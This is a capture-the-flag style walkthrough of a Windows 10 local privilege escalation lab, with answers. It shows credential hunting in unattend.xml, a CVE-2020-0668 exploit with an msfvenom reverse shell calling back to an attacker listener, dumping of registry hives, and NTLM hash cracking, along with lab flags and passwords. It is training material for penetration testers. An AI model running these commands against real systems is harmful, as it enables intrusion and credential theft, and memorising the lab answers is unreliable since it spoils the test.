# Skills Assessment 2

As an add-on to their annual penetration test, the INLANEFREIGHT organization has asked you to perform a security review of their standard Windows 10 gold image build currently in use by over 1,200 of their employees worldwide. The new CISO is worried that best practices were not followed when establishing the image baseline, and there may be one or more local privilege escalation vectors present in the build. Above all, the CISO wants to protect the company's internal infrastructure by ensuring that an attacker who can gain access to a workstation (through a phishing attack, for example) would be unable to escalate privileges and use that access move laterally through the network. Due to regulatory requirements, INLANEFREIGHT employees do not have local administrator privileges on their workstations.

You have been granted a standard user account with RDP access to a clone of a standard user Windows 10 workstation with no internet access. The client wants as comprehensive an assessment as possible (they will likely hire your firm to test/attempt to bypass EDR controls in the future); therefore, Defender has been disabled. Due to regulatory controls, they cannot allow internet access to the host, so you will need to transfer any tools over yourself.

Enumerate the host fully and attempt to escalate privileges to administrator/SYSTEM level access.

## Questions

<details>

<summary>Initial Enumeration</summary>

### Password Enumeration

```
PS C:\> findstr /SIM /C:"iamtheadministrator" *.txt *.ini *.cfg *.config *.xml
Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Windows\Panther\unattend.xml
FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
FINDSTR: Cannot open Windows\PLA\System\System Diagnostics.xml
FINDSTR: Cannot open Windows\PLA\System\System Performance.xml
FINDSTR: Cannot open Windows\System32\LogFiles\setupcln\diagerr.xml
FINDSTR: Cannot open Windows\System32\LogFiles\setupcln\diagwrn.xml
FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagerr.xml
FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagwrn.xml
FINDSTR: Cannot open Windows\WinSxS\amd64_microsoft-windows-u..userpredictionmodel_31bf3856ad364e35_10.0.18362.1_none_5f36214c9498167b\SBCModel.txt
```

We found the unattend.xml file which contains the credentials

![](<../../.gitbook/assets/image (99).png>)

<pre><code><strong>iamtheadministrator:Inl@n3fr3ight_sup3rAdm1n!
</strong></code></pre>

</details>



<details>

<summary>Privilege escalation</summary>

The host seems to be vulnerable to CVE-2020-0668

![](<../../.gitbook/assets/image (115).png>)

To exploit this vulnerability first find and verify that we have a read and write access to the binary running in SYSTEM context.

```
PS C:\Users\htb-student\Desktop> icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"     C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We can see that Users has a following output which could be exploitable.

```
BUILTIN\Users:(I)(RX)
```

Next Generating the reverse shell payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=7890 -f exe -o script.exe
```

make a copy of the payload **(one wil be corrupted in the first attempt)**

![](<../../.gitbook/assets/image (125).png>) **(make sure to rename them to the target binary or mainenanceservice.exe)**

executing the exploit along with the first reverse shell payload **(make sure that the files passed in are all full path!!)**

<pre><code><strong>.\&#x3C;exploit.exe> .\&#x3C;reverse shell.exe> "&#x3C;system context binary .exe>
</strong>.\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
</code></pre>

We can see the following that the file has changed it's permissions

```
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          ACADEMY-WINLPE-\htb-student:(I)(F)
                                                                          ACADEMY-WINLPE-\mrb3n:(I)(F)
```

Change the session to cmd and copy the 2nd copy of the reverse shell file using following command

```
cmd
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Desktop>copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
        1 file(s) copied.
```

**Lastly, start the service and wait for the shell to arrive**

```
C:\Users\htb-student\Desktop>net start MozillaMaintenance
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

```
rlwrap nc -lvnp 7890
listening on [any] 7890 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.250.154] 49681
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
el3vatEd_1nstall$_v3ry_r1sky
C:\Users\Administrator\Desktop>
```

</details>



<details>

<summary>Post exploitation</summary>

dump **SAM SYSTEM** and **SECURITY** hives

```
C:\Users\Administrator\Desktop>reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\Users\Administrator\Desktop>reg.exe save hklm\system C:\system.save
reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\Users\Administrator\Desktop>reg.exe save hklm\security C:\security.save
reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Move them to attack machine and crack them locally

```
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xfab4b2e32a415ea36f846b9408aa69af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6b4dacb8dbcf0533bbe34dc66cc0fb8848b0e8ba
dpapi_userkey:0xa61d37e2c548f9206031efff6633f3fb836dbdd6
[*] NL$KM 
 0000   84 AF 72 07 AA 56 82 65  33 F2 C4 60 C3 72 AF C7   ..r..V.e3..`.r..
 0010   E3 0B 71 ED C9 AF 49 1E  89 E5 DA A1 07 5E 7F 88   ..q...I......^..
 0020   65 EC 26 AF 2D A9 2A DC  9C E6 36 7D 9A 2F D9 F6   e.&.-.*...6}./..
 0030   57 44 B6 06 A6 57 7E 29  CD 30 B2 8F 7F 86 CB 47   WD...W~).0.....G
NL$KM:84af7207aa56826533f2c460c372afc7e30b71edc9af491e89e5daa1075e7f8865ec26af2da92adc9ce6367d9a2fd9f65744b606a6577e29cd30b28f7f86cb47
[*] Cleaning up...
```

```
wksadmin #seems to be our target.
```

hash cracking&#x20;

```
echo "wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::" > hash
hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt

5835048ce94ad0564e29a924a03510ef:password1
```

</details>

Find left behind cleartext credentials for the iamtheadministrator domain admin account.



Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop

* ```
  el3vatEd_1nstall$_v3ry_r1sky
  ```

There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account.

* ```
  5835048ce94ad0564e29a924a03510ef:password1
  ```
